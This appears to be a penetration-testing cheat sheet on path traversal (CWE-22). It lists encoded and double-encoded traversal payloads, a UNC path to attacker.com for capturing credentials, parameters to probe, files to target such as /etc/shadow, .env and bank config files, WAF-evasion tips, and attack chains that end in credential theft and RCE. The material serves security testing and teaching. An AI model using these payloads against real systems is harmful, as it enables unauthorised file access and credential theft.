# 24 — Path Traversal

**CWE-22** | **CVSS: 7.5–9.8** | **OWASP A01:2021**

---

## What Is It?

Path traversal (directory traversal) allows attackers to read arbitrary files outside the intended web root, including configuration files, credentials, and OS files.

> **Core Problem:** User-supplied filename or path input not properly sanitized before file operations.

---

## Vulnerability Types

| Type | Description |
|------|-------------|
| **Basic Traversal** | `../../../etc/passwd` in filename or path parameter. |
| **Encoded Traversal** | `%2e%2e%2f`, `%252e%252e%252f` (double URL encode), `..%2f` |
| **Null Byte Injection** | `../../etc/passwd%00.jpg` — truncate extension on old PHP. |
| **UNC Path (Windows)** | `\\attacker.com\share` — trigger authentication to attacker. |
| **Zip Slip** | Archive extraction with `../` in filenames — write outside intended dir. |

---

## Hunting Methodology

1. Find file download/read parameters: `?file=`, `?path=`, `?template=`, `?document=`, `?img=`.
2. Test basic: `?file=../../../../etc/passwd`
3. Test URL encoded: `?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd`
4. Test double encoded: `?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd`
5. Test Windows paths: `?file=..\..\Windows\win.ini`
6. Target high-value files: `/etc/passwd`, `/etc/shadow`, `/proc/self/environ`, `.env`, `config.php`.

---

## Tips & Tricks

- **#1** Try multiple encoding layers — some WAFs only decode once.
- **#2** Target `/proc/self/environ` first — reveals environment variables and potentially secrets.
- **#3** On Windows: try both `/` and `\` separators, and UNC paths.
- **#4** Banking: `/etc/app/database.properties`, `/opt/app/config.yml` — common credential locations.

---

## Deadly Chains

```
Path traversal → read /etc/passwd → username list → brute force
Path traversal → read .env file → DB credentials → full database access
Path traversal → read SSL private key → MITM all traffic
Zip Slip → overwrite config file → RCE via next request
```
